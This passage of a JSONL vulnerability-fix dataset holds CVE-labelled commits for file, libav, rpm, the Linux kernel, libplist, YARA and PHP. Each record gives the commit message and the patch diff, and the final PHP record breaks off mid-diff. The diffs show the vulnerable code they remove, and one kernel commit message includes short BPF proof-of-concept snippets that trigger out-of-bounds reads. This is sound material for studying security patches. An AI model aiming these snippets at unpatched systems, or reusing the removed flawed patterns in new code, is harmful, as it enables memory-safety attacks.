{"CVE_ID": "CVE-2014-9621", "CWE_ID": "399", "category": "security", "commit_id": "65437cee25199dbd385fb35901bc0011e164276c", "commit_message": "From 65437cee25199dbd385fb35901bc0011e164276c Mon Sep 17 00:00:00 2001\nFrom: Christos Zoulas <christos@zoulas.com>\nDate: Tue, 16 Dec 2014 23:29:42 +0000\nSubject: [PATCH] Limit string printing to 100 chars, and add flags I forgot in\n the previous commit.\n\n---\n src/readelf.c | 11 ++++++++---\n 1 file changed, 8 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/src/readelf.c b/src/readelf.c\nindex 8e50d7281..cd1f79d5f 100644\n--- a/src/readelf.c\n+++ b/src/readelf.c\n@@ -27,7 +27,7 @@\n #include \"file.h\"\n \n #ifndef lint\n-FILE_RCSID(\"@(#)$File: readelf.c,v 1.115 2014/12/16 20:53:05 christos Exp $\")\n+FILE_RCSID(\"@(#)$File: readelf.c,v 1.116 2014/12/16 23:18:40 christos Exp $\")\n #endif\n \n #ifdef BUILTIN_ELF\n@@ -900,19 +900,23 @@ donote(struct magic_set *ms, void *vbuf, size_t offset, size_t size,\n \t}\n \n \tif (namesz == 7 && strcmp((char *)&nbuf[noff], \"NetBSD\") == 0) {\n+\t\tif (descsz > 100)\n+\t\t\tdescsz = 100;\n \t\tswitch (xnh_type) {\n \t    \tcase NT_NETBSD_VERSION:\n \t\t\treturn size;\n \t\tcase NT_NETBSD_MARCH:\n \t\t\tif (*flags & FLAGS_DID_NETBSD_MARCH)\n \t\t\t\treturn size;\n-\t\t\tif (file_printf(ms, \", compiled for: %.*s\", (int)descsz,\n-\t\t\t    (const char *)&nbuf[doff]) == -1)\n+\t\t\t*flags |= FLAGS_DID_NETBSD_MARCH;\n+\t\t\tif (file_printf(ms, \", compiled for: %.*s\",\n+\t\t\t    (int)descsz, (const char *)&nbuf[doff]) == -1)\n \t\t\t\treturn size;\n \t\t\tbreak;\n \t\tcase NT_NETBSD_CMODEL:\n \t\t\tif (*flags & FLAGS_DID_NETBSD_CMODEL)\n \t\t\t\treturn size;\n+\t\t\t*flags |= FLAGS_DID_NETBSD_CMODEL;\n \t\t\tif (file_printf(ms, \", compiler model: %.*s\",\n \t\t\t    (int)descsz, (const char *)&nbuf[doff]) == -1)\n \t\t\t\treturn size;\n@@ -920,6 +924,7 @@ donote(struct magic_set *ms, void *vbuf, size_t offset, size_t size,\n \t\tdefault:\n \t\t\tif (*flags & FLAGS_DID_NETBSD_UNKNOWN)\n \t\t\t\treturn size;\n+\t\t\t*flags |= FLAGS_DID_NETBSD_UNKNOWN;\n \t\t\tif (file_printf(ms, \", note=%u\", xnh_type) == -1)\n \t\t\t\treturn size;\n \t\t\tbreak;\n", "owner": "file", "repo": "file", "source": "cve"}
{"CVE_ID": "CVE-2016-8675", "CWE_ID": "476", "category": "security", "commit_id": "e5b019725f53b79159931d3a7317107cbbfd0860", "commit_message": "From e5b019725f53b79159931d3a7317107cbbfd0860 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Sun, 7 Sep 2014 16:39:39 +0200\nSubject: [PATCH] m4vdec: Check for non-startcode 00 00 00 sequences in probe\n\nThis makes the m4v detection less trigger-happy.\n\nBug-Id: 949\nSigned-off-by: Diego Biurrun <diego@biurrun.de>\n---\n libavformat/m4vdec.c | 8 +++++---\n 1 file changed, 5 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/libavformat/m4vdec.c b/libavformat/m4vdec.c\nindex 4a0af3c037..9d69dcc042 100644\n--- a/libavformat/m4vdec.c\n+++ b/libavformat/m4vdec.c\n@@ -33,16 +33,18 @@ static int mpeg4video_probe(AVProbeData *probe_packet)\n \n     for (i = 0; i < probe_packet->buf_size; i++) {\n         temp_buffer = (temp_buffer << 8) + probe_packet->buf[i];\n-        if ((temp_buffer & 0xffffff00) != 0x100)\n+        if (temp_buffer & 0xfffffe00)\n+            continue;\n+        if (temp_buffer < 2)\n             continue;\n \n         if (temp_buffer == VOP_START_CODE)\n             VOP++;\n         else if (temp_buffer == VISUAL_OBJECT_START_CODE)\n             VISO++;\n-        else if (temp_buffer < 0x120)\n+        else if (temp_buffer >= 0x100 && temp_buffer < 0x120)\n             VO++;\n-        else if (temp_buffer < 0x130)\n+        else if (temp_buffer >= 0x120 && temp_buffer < 0x130)\n             VOL++;\n         else if (!(0x1AF < temp_buffer && temp_buffer < 0x1B7) &&\n                  !(0x1B9 < temp_buffer && temp_buffer < 0x1C4))\n", "owner": "libav", "repo": "libav", "source": "cve"}
{"CVE_ID": "CVE-2017-7500", "CWE_ID": "59", "category": "security", "commit_id": "c815822c8bdb138066ff58c624ae83e3a12ebfa9", "commit_message": "From c815822c8bdb138066ff58c624ae83e3a12ebfa9 Mon Sep 17 00:00:00 2001\nFrom: Panu Matilainen <pmatilai@redhat.com>\nDate: Wed, 27 Sep 2017 13:45:17 +0300\nSubject: [PATCH] Make verification match the new restricted directory symlink\n behavior\n\nOnly follow directory symlinks owned by target directory owner or root\nduring verification to match the behavior of fsmVerify() in the new\nCVE-2017-7500 world order.\n\nThe code is klunkier than it should and the logic should use common code\nwith fsmVerify() instead of duplicating it here, but that needs more\nchanges than is comfortable to backport so starting with this.\n\nAlso worth noting that the previous \"follow the link\" logic from\ncommit 3ccd774255b8215733e0bdfdf5a683da9dd10923 was not quite right,\nit'd fail with RPMVERIFY_LSTATFAIL on a broken symlink when it should've\nran verification on the symlink itself. This behavior is fixed here too.\n\nFinally, once again fakechroot gets in the way and forces the related\nverify testcase to be changed to be able to create a valid link. Reuse\nthe replacement testcase for the purpose and add another case for\nverifying an invalid link.\n---\n lib/verify.c       | 15 ++++++++++---\n tests/rpmverify.at | 56 ++++++++++++++++++++++++++++++++++++++--------\n 2 files changed, 59 insertions(+), 12 deletions(-)\n\n", "diff_code": "diff --git a/lib/verify.c b/lib/verify.c\nindex 0eac812ae..62eec0861 100644\n--- a/lib/verify.c\n+++ b/lib/verify.c\n@@ -94,9 +94,18 @@ rpmVerifyAttrs rpmfilesVerify(rpmfiles fi, int ix, rpmVerifyAttrs omitMask)\n     }\n \n     /* If we expected a directory but got a symlink to one, follow the link */\n-    if (S_ISDIR(fmode) && S_ISLNK(sb.st_mode) && stat(fn, &sb) != 0) {\n-\tvfy |= RPMVERIFY_LSTATFAIL;\n-\tgoto exit;\n+    if (S_ISDIR(fmode) && S_ISLNK(sb.st_mode)) {\n+\tstruct stat dsb;\n+\t/* ...if it actually points to a directory  */\n+\tif (stat(fn, &dsb) == 0 && S_ISDIR(dsb.st_mode)) {\n+\t    uid_t fuid;\n+\t    /* ...and is by a legit user, to match fsmVerify() behavior */\n+\t    if (sb.st_uid == 0 ||\n+\t\t\t(rpmugUid(rpmfilesFUser(fi, ix), &fuid) == 0 &&\n+\t\t\t sb.st_uid == fuid)) {\n+\t\tsb = dsb; /* struct assignment */\n+\t    }\n+\t}\n     }\n \n     /* Links have no mode, other types have no linkto */\ndiff --git a/tests/rpmverify.at b/tests/rpmverify.at\nindex 8e2938259..c5530de69 100644\n--- a/tests/rpmverify.at\n+++ b/tests/rpmverify.at\n@@ -69,18 +69,56 @@ AT_KEYWORDS([verify])\n AT_CHECK([\n RPMDB_CLEAR\n RPMDB_INIT\n+tf=\"${RPMTEST}\"/opt/foo\n+rm -rf \"${RPMTEST}\"/opt/*\n+rm -rf \"${TOPDIR}\"\n \n-runroot rpm -U --nodeps --noscripts --ignorearch --ignoreos \\\n-\t/data/RPMS/hello-1.0-1.i386.rpm\n-mv \"${RPMTEST}\"/usr/share/doc/hello-1.0 \"${RPMTEST}\"/usr/share/doc/hello-1.0.orig\n-ln -s hello-1.0.orig \"${RPMTEST}\"/usr/share/doc/hello-1.0\n-runroot rpm -Vva --nodeps --nouser --nogroup\n-rm -rf \"${RPMTEST}\"/usr/share/doc/\n+runroot rpmbuild --quiet -bb \\\n+        --define \"ver 1.0\" \\\n+        --define \"filetype datadir\" \\\n+        --define \"filedata README1\" \\\n+        --define \"user $(id -u -n)\" \\\n+          /data/SPECS/replacetest.spec\n+\n+runroot rpm -U /build/RPMS/noarch/replacetest-1.0-1.noarch.rpm\n+mv \"${RPMTEST}\"/opt/foo \"${RPMTEST}\"/opt/was\n+ln -s was \"${RPMTEST}\"/opt/foo\n+runroot rpm -Vv replacetest\n ],\n [0],\n-[.........    /usr/local/bin/hello\n-.........    /usr/share/doc/hello-1.0\n-.........  d /usr/share/doc/hello-1.0/FAQ\n+[.........    /opt/foo\n+.........    /opt/foo/README1\n+.........    /opt/goo\n+.........    /opt/zoo\n+],\n+[])\n+AT_CLEANUP\n+\n+AT_SETUP([directory replaced with an invalid directory symlink])\n+AT_KEYWORDS([verify])\n+AT_CHECK([\n+RPMDB_CLEAR\n+RPMDB_INIT\n+tf=\"${RPMTEST}\"/opt/foo\n+rm -rf \"${RPMTEST}\"/opt/*\n+rm -rf \"${TOPDIR}\"\n+\n+runroot rpmbuild --quiet -bb \\\n+        --define \"ver 1.0\" \\\n+        --define \"filetype datadir\" \\\n+        --define \"filedata README1\" \\\n+          /data/SPECS/replacetest.spec\n+\n+runroot rpm -U /build/RPMS/noarch/replacetest-1.0-1.noarch.rpm\n+mv \"${RPMTEST}\"/opt/foo \"${RPMTEST}\"/opt/was\n+ln -s was \"${RPMTEST}\"/opt/foo\n+runroot rpm -Vv --nouser --nogroup replacetest\n+],\n+[1],\n+[....L....    /opt/foo\n+.........    /opt/foo/README1\n+.........    /opt/goo\n+.........    /opt/zoo\n ],\n [])\n AT_CLEANUP\n", "owner": "rpm-software-management", "repo": "rpm", "source": "cve"}
{"CVE_ID": "CVE-2014-3144", "CWE_ID": "189", "category": "security", "commit_id": "05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "commit_message": "From 05ab8f2647e4221cbdb3856dd7d32bd5407316b3 Mon Sep 17 00:00:00 2001\nFrom: Mathias Krause <minipli@googlemail.com>\nDate: Sun, 13 Apr 2014 18:23:33 +0200\nSubject: filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net/core/filter.c | 8 +++++++-\n 1 file changed, 7 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/net/core/filter.c b/net/core/filter.c\nindex e08b3822c72a..0e0856f5d708 100644\n--- a/net/core/filter.c\n+++ b/net/core/filter.c\n@@ -600,6 +600,9 @@ static u64 __skb_get_nlattr(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n+\tif (skb->len < sizeof(struct nlattr))\n+\t\treturn 0;\n+\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n@@ -618,11 +621,14 @@ static u64 __skb_get_nlattr_nest(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n+\tif (skb->len < sizeof(struct nlattr))\n+\t\treturn 0;\n+\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n \tnla = (struct nlattr *) &skb->data[A];\n-\tif (nla->nla_len > A - skb->len)\n+\tif (nla->nla_len > skb->len - A)\n \t\treturn 0;\n \n \tnla = nla_find_nested(nla, X);\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-0823", "CWE_ID": "200", "category": "security", "commit_id": "ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce", "commit_message": "From ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce Mon Sep 17 00:00:00 2001\nFrom: \"Kirill A. Shutemov\" <kirill.shutemov@linux.intel.com>\nDate: Mon, 9 Mar 2015 23:11:12 +0200\nSubject: [PATCH] pagemap: do not leak physical addresses to non-privileged\n userspace\n\nAs pointed by recent post[1] on exploiting DRAM physical imperfection,\n/proc/PID/pagemap exposes sensitive information which can be used to do\nattacks.\n\nThis disallows anybody without CAP_SYS_ADMIN to read the pagemap.\n\n[1] http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html\n\n[ Eventually we might want to do anything more finegrained, but for now\n  this is the simple model.   - Linus ]\n\nSigned-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>\nAcked-by: Konstantin Khlebnikov <khlebnikov@openvz.org>\nAcked-by: Andy Lutomirski <luto@amacapital.net>\nCc: Pavel Emelyanov <xemul@parallels.com>\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Mark Seaborn <mseaborn@chromium.org>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs/proc/task_mmu.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n", "diff_code": "diff --git a/fs/proc/task_mmu.c b/fs/proc/task_mmu.c\nindex 956b75d61809f..6dee68d013ffa 100644\n--- a/fs/proc/task_mmu.c\n+++ b/fs/proc/task_mmu.c\n@@ -1325,6 +1325,9 @@ static ssize_t pagemap_read(struct file *file, char __user *buf,\n \n static int pagemap_open(struct inode *inode, struct file *file)\n {\n+\t/* do not disclose physical addresses: attack vector */\n+\tif (!capable(CAP_SYS_ADMIN))\n+\t\treturn -EPERM;\n \tpr_warn_once(\"Bits 55-60 of /proc/PID/pagemap entries are about \"\n \t\t\t\"to stop being page-shift some time soon. See the \"\n \t\t\t\"linux/Documentation/vm/pagemap.txt for details.\\n\");\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2014-3646", "CWE_ID": "264", "category": "security", "commit_id": "a642fc305053cc1c6e47e4f4df327895747ab485", "commit_message": "From a642fc305053cc1c6e47e4f4df327895747ab485 Mon Sep 17 00:00:00 2001\nFrom: Petr Matousek <pmatouse@redhat.com>\nDate: Tue, 23 Sep 2014 20:22:30 +0200\nSubject: [PATCH] kvm: vmx: handle invvpid vm exit gracefully\n\nOn systems with invvpid instruction support (corresponding bit in\nIA32_VMX_EPT_VPID_CAP MSR is set) guest invocation of invvpid\ncauses vm exit, which is currently not handled and results in\npropagation of unknown exit to userspace.\n\nFix this by installing an invvpid vm exit handler.\n\nThis is CVE-2014-3646.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Petr Matousek <pmatouse@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch/x86/include/uapi/asm/vmx.h | 2 ++\n arch/x86/kvm/vmx.c              | 9 ++++++++-\n 2 files changed, 10 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/arch/x86/include/uapi/asm/vmx.h b/arch/x86/include/uapi/asm/vmx.h\nindex 0e79420376eb9..990a2fe1588d5 100644\n--- a/arch/x86/include/uapi/asm/vmx.h\n+++ b/arch/x86/include/uapi/asm/vmx.h\n@@ -67,6 +67,7 @@\n #define EXIT_REASON_EPT_MISCONFIG       49\n #define EXIT_REASON_INVEPT              50\n #define EXIT_REASON_PREEMPTION_TIMER    52\n+#define EXIT_REASON_INVVPID             53\n #define EXIT_REASON_WBINVD              54\n #define EXIT_REASON_XSETBV              55\n #define EXIT_REASON_APIC_WRITE          56\n@@ -114,6 +115,7 @@\n \t{ EXIT_REASON_EOI_INDUCED,           \"EOI_INDUCED\" }, \\\n \t{ EXIT_REASON_INVALID_STATE,         \"INVALID_STATE\" }, \\\n \t{ EXIT_REASON_INVD,                  \"INVD\" }, \\\n+\t{ EXIT_REASON_INVVPID,               \"INVVPID\" }, \\\n \t{ EXIT_REASON_INVPCID,               \"INVPCID\" }\n \n #endif /* _UAPIVMX_H */\ndiff --git a/arch/x86/kvm/vmx.c b/arch/x86/kvm/vmx.c\nindex 7e2c098b59c9a..cf3cd079ec523 100644\n--- a/arch/x86/kvm/vmx.c\n+++ b/arch/x86/kvm/vmx.c\n@@ -6746,6 +6746,12 @@ static int handle_invept(struct kvm_vcpu *vcpu)\n \treturn 1;\n }\n \n+static int handle_invvpid(struct kvm_vcpu *vcpu)\n+{\n+\tkvm_queue_exception(vcpu, UD_VECTOR);\n+\treturn 1;\n+}\n+\n /*\n  * The exit handlers return 1 if the exit was handled fully and guest execution\n  * may resume.  Otherwise they set the kvm_run parameter to indicate what needs\n@@ -6791,6 +6797,7 @@ static int (*const kvm_vmx_exit_handlers[])(struct kvm_vcpu *vcpu) = {\n \t[EXIT_REASON_MWAIT_INSTRUCTION]\t      = handle_mwait,\n \t[EXIT_REASON_MONITOR_INSTRUCTION]     = handle_monitor,\n \t[EXIT_REASON_INVEPT]                  = handle_invept,\n+\t[EXIT_REASON_INVVPID]                 = handle_invvpid,\n };\n \n static const int kvm_vmx_max_exit_handlers =\n@@ -7026,7 +7033,7 @@ static bool nested_vmx_exit_handled(struct kvm_vcpu *vcpu)\n \tcase EXIT_REASON_VMPTRST: case EXIT_REASON_VMREAD:\n \tcase EXIT_REASON_VMRESUME: case EXIT_REASON_VMWRITE:\n \tcase EXIT_REASON_VMOFF: case EXIT_REASON_VMON:\n-\tcase EXIT_REASON_INVEPT:\n+\tcase EXIT_REASON_INVEPT: case EXIT_REASON_INVVPID:\n \t\t/*\n \t\t * VMX instructions trap unconditionally. This allows L1 to\n \t\t * emulate them for its L2 guest, i.e., allows 3-level nesting!\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-6435", "CWE_ID": "119", "category": "security", "commit_id": "fbd8494d5e4e46bf2e90cb6116903e404374fb56", "commit_message": "From fbd8494d5e4e46bf2e90cb6116903e404374fb56 Mon Sep 17 00:00:00 2001\nFrom: Nikias Bassen <nikias@gmx.li>\nDate: Tue, 7 Feb 2017 12:43:27 +0100\nSubject: [PATCH] bplist: Make sure to bail out if malloc() fails in\n parse_string_node()\n\nCredit to Wang Junjie <zhunkibatu@gmail.com> (#93)\n---\n src/bplist.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n", "diff_code": "diff --git a/src/bplist.c b/src/bplist.c\nindex 81bd7166..20e5090e 100644\n--- a/src/bplist.c\n+++ b/src/bplist.c\n@@ -289,6 +289,11 @@ static plist_t parse_string_node(const char **bnode, uint64_t size)\n \n     data->type = PLIST_STRING;\n     data->strval = (char *) malloc(sizeof(char) * (size + 1));\n+    if (!data->strval) {\n+        plist_free_data(data);\n+        PLIST_BIN_ERR(\"%s: Could not allocate %\" PRIu64 \" bytes\\n\", __func__, sizeof(char) * (size + 1));\n+        return NULL;\n+    }\n     memcpy(data->strval, *bnode, size);\n     data->strval[size] = '\\0';\n     data->length = strlen(data->strval);\n", "owner": "libimobiledevice", "repo": "libplist", "source": "cve"}
{"CVE_ID": "CVE-2016-10210", "CWE_ID": "476", "category": "security", "commit_id": "3119b232c9c453c98d8fa8b6ae4e37ba18117cd4", "commit_message": "From 3119b232c9c453c98d8fa8b6ae4e37ba18117cd4 Mon Sep 17 00:00:00 2001\nFrom: Hilko Bengen <hillu@users.noreply.github.com>\nDate: Tue, 17 Jan 2017 17:07:02 +0100\nSubject: [PATCH] re_lexer: Make reading escape sequences more robust (#586)\n\n* Add test for issue #503\n\n* re_lexer: Make reading escape sequences more robust\n\nThis commit fixes parsing incomplete escape sequences at the end of a\nregular expression and parsing things like \\xxy (invalid hex digits)\nwhich before were silently turned into (char)255.\n\nClose #503\n\n* Update re_lexer.c\n---\n libyara/re_lexer.c | 40 ++++++++++++++++++++--------------------\n libyara/re_lexer.l | 12 ++++++------\n tests/test-rules.c |  6 ++++++\n 3 files changed, 32 insertions(+), 26 deletions(-)\n\n", "diff_code": "diff --git a/libyara/re_lexer.c b/libyara/re_lexer.c\nindex 82d48719..f0940a8b 100644\n--- a/libyara/re_lexer.c\n+++ b/libyara/re_lexer.c\n@@ -190,7 +190,7 @@ typedef size_t yy_size_t;\n \n     /* Note: We specifically omit the test for yy_rule_can_match_eol because it requires\n      *       access to the local variable yy_act. Since yyless() is a macro, it would break\n-     *       existing scanners that call yyless() from OUTSIDE re_yylex. \n+     *       existing scanners that call yyless() from OUTSIDE re_yylex.\n      *       One obvious solution it to make yy_act a global. I tried that, and saw\n      *       a 5% performance hit in a non-yylineno scanner, because yy_act is\n      *       normally declared as a register variable-- so it is not worth it.\n@@ -266,7 +266,7 @@ struct yy_buffer_state\n \n     int yy_bs_lineno; /**< The line count. */\n     int yy_bs_column; /**< The column count. */\n-    \n+\n \t/* Whether to try to fill the input buffer when we reach the\n \t * end of it.\n \t */\n@@ -906,7 +906,7 @@ YY_DECL\n \t\t\tyy_size_t yyl;\n \t\t\tfor ( yyl = 0; yyl < yyleng; ++yyl )\n \t\t\t\tif ( yytext[yyl] == '\\n' )\n-\t\t\t\t\t   \n+\t\t\t\t\t\n     do{ yylineno++;\n         yycolumn=0;\n     }while(0)\n@@ -1125,7 +1125,7 @@ YY_RULE_SETUP\n   }\n   else\n   {\n-    yyerror(yyscanner, lex_env, \"unexpected end of buffer\");\n+    yyerror(yyscanner, lex_env, \"illegal escape sequence\");\n     yyterminate();\n   }\n }\n@@ -1180,7 +1180,7 @@ YY_RULE_SETUP\n   {\n     if (!read_escaped_char(yyscanner, &end))\n     {\n-      yyerror(yyscanner, lex_env, \"unexpected end of buffer\");\n+      yyerror(yyscanner, lex_env, \"illegal escape sequence\");\n       yyterminate();\n     }\n   }\n@@ -1292,7 +1292,7 @@ YY_RULE_SETUP\n   }\n   else\n   {\n-    yyerror(yyscanner, lex_env, \"unexpected end of buffer\");\n+    yyerror(yyscanner, lex_env, \"illegal escape sequence\");\n     yyterminate();\n   }\n }\n@@ -1763,7 +1763,7 @@ static int yy_get_next_buffer (yyscan_t yyscanner)\n \tyyg->yy_hold_char = *++yyg->yy_c_buf_p;\n \n \tif ( c == '\\n' )\n-\t\t   \n+\t\t\n     do{ yylineno++;\n         yycolumn=0;\n     }while(0)\n@@ -2018,9 +2018,9 @@ static void re_yyensure_buffer_stack (yyscan_t yyscanner)\n \t\t\t\t\t\t\t\t, yyscanner);\n \t\tif ( ! yyg->yy_buffer_stack )\n \t\t\tYY_FATAL_ERROR( \"out of dynamic memory in re_yyensure_buffer_stack()\" );\n-\t\t\t\t\t\t\t\t  \n+\n \t\tmemset(yyg->yy_buffer_stack, 0, num_to_alloc * sizeof(struct yy_buffer_state*));\n-\t\t\t\t\n+\n \t\tyyg->yy_buffer_stack_max = num_to_alloc;\n \t\tyyg->yy_buffer_stack_top = 0;\n \t\treturn;\n@@ -2049,7 +2049,7 @@ static void re_yyensure_buffer_stack (yyscan_t yyscanner)\n  * @param base the character buffer\n  * @param size the size in bytes of the character buffer\n  * @param yyscanner The scanner object.\n- * @return the newly allocated buffer state object. \n+ * @return the newly allocated buffer state object.\n  */\n YY_BUFFER_STATE re_yy_scan_buffer  (char * base, yy_size_t  size , yyscan_t yyscanner)\n {\n@@ -2177,7 +2177,7 @@ YY_EXTRA_TYPE re_yyget_extra  (yyscan_t yyscanner)\n int re_yyget_lineno  (yyscan_t yyscanner)\n {\n     struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n-    \n+\n         if (! YY_CURRENT_BUFFER)\n             return 0;\n     \n@@ -2190,7 +2190,7 @@ int re_yyget_lineno  (yyscan_t yyscanner)\n int re_yyget_column  (yyscan_t yyscanner)\n {\n     struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n-    \n+\n         if (! YY_CURRENT_BUFFER)\n             return 0;\n     \n@@ -2365,20 +2365,20 @@ int re_yylex_init_extra(YY_EXTRA_TYPE yy_user_defined,yyscan_t* ptr_yy_globals )\n         errno = EINVAL;\n         return 1;\n     }\n-\t\n+\n     *ptr_yy_globals = (yyscan_t) re_yyalloc ( sizeof( struct yyguts_t ), &dummy_yyguts );\n-\t\n+\n     if (*ptr_yy_globals == NULL){\n         errno = ENOMEM;\n         return 1;\n     }\n-    \n+\n     /* By setting to 0xAA, we expose bugs in\n     yy_init_globals. Leave at 0x00 for releases. */\n     memset(*ptr_yy_globals,0x00,sizeof(struct yyguts_t));\n-    \n+\n     re_yyset_extra (yy_user_defined, *ptr_yy_globals);\n-    \n+\n     return yy_init_globals ( *ptr_yy_globals );\n }\n \n@@ -2568,19 +2568,19 @@ int read_escaped_char(\n   text[0] = '\\\\';\n   text[1] = RE_YY_INPUT(yyscanner);\n \n-  if (text[1] == EOF)\n+  if (text[1] == EOF || text[1] == 0)\n     return 0;\n \n   if (text[1] == 'x')\n   {\n     text[2] = RE_YY_INPUT(yyscanner);\n \n-    if (text[2] == EOF)\n+    if (!isxdigit(text[2]))\n       return 0;\n \n     text[3] = RE_YY_INPUT(yyscanner);\n \n-    if (text[3] == EOF)\n+    if (!isxdigit(text[3]))\n       return 0;\n   }\n \ndiff --git a/libyara/re_lexer.l b/libyara/re_lexer.l\nindex 1b3f5aa8..9e0b0054 100644\n--- a/libyara/re_lexer.l\n+++ b/libyara/re_lexer.l\n@@ -261,7 +261,7 @@ hex_digit     [0-9a-fA-F]\n   }\n   else\n   {\n-    yyerror(yyscanner, lex_env, \"unexpected end of buffer\");\n+    yyerror(yyscanner, lex_env, \"illegal escape sequence\");\n     yyterminate();\n   }\n }\n@@ -312,7 +312,7 @@ hex_digit     [0-9a-fA-F]\n   {\n     if (!read_escaped_char(yyscanner, &end))\n     {\n-      yyerror(yyscanner, lex_env, \"unexpected end of buffer\");\n+      yyerror(yyscanner, lex_env, \"illegal escape sequence\");\n       yyterminate();\n     }\n   }\n@@ -410,7 +410,7 @@ hex_digit     [0-9a-fA-F]\n   }\n   else\n   {\n-    yyerror(yyscanner, lex_env, \"unexpected end of buffer\");\n+    yyerror(yyscanner, lex_env, \"illegal escape sequence\");\n     yyterminate();\n   }\n }\n@@ -524,19 +524,19 @@ int read_escaped_char(\n   text[0] = '\\\\';\n   text[1] = RE_YY_INPUT(yyscanner);\n \n-  if (text[1] == EOF)\n+  if (text[1] == EOF || text[1] == 0)\n     return 0;\n \n   if (text[1] == 'x')\n   {\n     text[2] = RE_YY_INPUT(yyscanner);\n \n-    if (text[2] == EOF)\n+    if (!isxdigit(text[2]))\n       return 0;\n \n     text[3] = RE_YY_INPUT(yyscanner);\n \n-    if (text[3] == EOF)\n+    if (!isxdigit(text[3]))\n       return 0;\n   }\n \ndiff --git a/tests/test-rules.c b/tests/test-rules.c\nindex 5570dbc4..556e3452 100644\n--- a/tests/test-rules.c\n+++ b/tests/test-rules.c\n@@ -1019,6 +1019,12 @@ void test_re()\n \n   // Test case for issue #324\n   assert_true_regexp(\"whatever|   x.   x\", \"   xy   x\", \"   xy   x\");\n+\n+  // test case for issue #503, \\x without two following hex-digits\n+  assert_regexp_syntax_error(\"\\\\x0\");\n+  assert_regexp_syntax_error(\"\\\\x\");\n+\n+  assert_regexp_syntax_error(\"\\\\xxy\");\n }\n \n \n", "owner": "VirusTotal", "repo": "yara", "source": "cve"}
{"CVE_ID": "CVE-2016-7133", "CWE_ID": "190", "category": "security", "commit_id": "c2a13ced4272f2e65d2773e2ea6ca11c1ce4a911", "commit_message": "From c2a13ced4272f2e65d2773e2ea6ca11c1ce4a911 Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Sun, 14 Aug 2016 19:07:15 -0700\nSubject: [PATCH] Fix bug #72742 - memory allocator fails to realloc small\n block to large one\n\n---\n Zend/zend_alloc.c | 24 ++++++++++++------------\n 1 file changed, 12 insertions(+), 12 deletions(-)\n\n", "diff_code": "diff --git a/Zend/zend_alloc.c b/Zend/zend_alloc.c\nindex 18765593174f..a79d67b4b996 100644\n--- a/Zend/zend_alloc.c\n+++ b/Zend/zend_alloc.c\n@@ -1548,21 +1548,21 @@ static void *zend_mm_realloc_heap(zend_mm_heap *heap, void *ptr, size_t size, si\n \n \t\tZEND_MM_CHECK(chunk->heap == heap, \"zend_mm_heap corrupted\");\n \t\tif (info & ZEND_MM_IS_SRUN) {\n-\t\t\tint old_bin_num, bin_num;\n-\n-\t\t\told_bin_num = ZEND_MM_SRUN_BIN_NUM(info);\n+\t\t\tint old_bin_num = ZEND_MM_SRUN_BIN_NUM(info);\n \t\t\told_size = bin_data_size[old_bin_num];\n-\t\t\tbin_num = 